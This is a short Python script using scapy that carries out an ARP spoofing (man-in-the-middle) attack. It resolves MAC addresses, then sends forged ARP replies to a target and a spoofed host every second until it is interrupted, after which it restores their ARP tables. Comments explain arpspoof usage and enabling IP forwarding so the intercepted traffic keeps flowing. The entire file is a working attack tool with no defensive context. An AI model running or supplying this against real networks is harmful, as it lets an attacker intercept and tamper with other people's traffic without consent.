#!/usr/bin/env/ python

#ARP isn't secure
#ARP is used by the devices to communicate on the same network
#ARP Spoof usually run via the arpspoof tool
#arpspoof -i interface -t targetIP GatewayIP
#arpspoof -i interface -t GatewayIP targetIP
#arpspoof -i interface -tell the first IP that you are the second IP
#enable port forwarding so the requests flow like a router
#echo 1> /proc/sys/net/ipv4/ip_forward

import scapy.all as sp
import argparse
import time

def scan(ip):
    arp_req = sp.ARP(pdst=ip)
    broadcast = sp.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_req
    answered = sp.srp(arp_broadcast, timeout=10, verbose=False)[0]
    return answered[0][1].hwsrc

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

def get_packet(targetIP, fakeIP):
    packet = sp.ARP()
    packet.op = 2
    packet.pdst = targetIP
    packet.psrc = fakeIP
    packet.hwdst = scan(targetIP)
    return packet
def get_packet_restore(targetIP, fakeIP):
    packet = sp.ARP()
    packet.op = 2
    packet.pdst = targetIP
    packet.psrc = fakeIP
    packet.hwdst = scan(targetIP)
    packet.hwsrc = scan(fakeIP)
    return packet

# since we need to make an ARP response we will set op to 2
parser = argparse.ArgumentParser()

parser = get_arg(parser, 't', 'targetIP', 'IP address of the target device')
parser = get_arg(parser, 'f', 'fakeIP', 'IP address that your device is mimicing')
parser = get_arg(parser, 'm', 'targetMAC', 'IP address of the target machine')

value = parser.parse_args()
packet1 = get_packet(value.targetIP, value.fakeIP)
packet2 = get_packet(value.fakeIP, value.targetIP)

count = 0
#print("Telling " + value.targetIP + " that I am "+ value.fakeIP)
#print("Telling " + value.fakeIP + " that I am "+ value.targetIP)
try:
    while True:
        sp.send(packet1, verbose=False)
        sp.send(packet2, verbose=False)
        count = count + 2
        print("\r[INFO] Sent " + str(count) + " packets", end="")
        time.sleep(1)

except KeyboardInterrupt:
    print("\n[INFO] Detected Ctrl+C...resetting ARP tables....")
    packet1 = get_packet_restore(value.targetIP, value.fakeIP)
    packet2 = get_packet_restore(value.fakeIP, value.targetIP)
    sp.send(packet1, count = 10, verbose=False)
    sp.send(packet2, count = 10, verbose=False)
    print("\n[INFO] Quitting....")




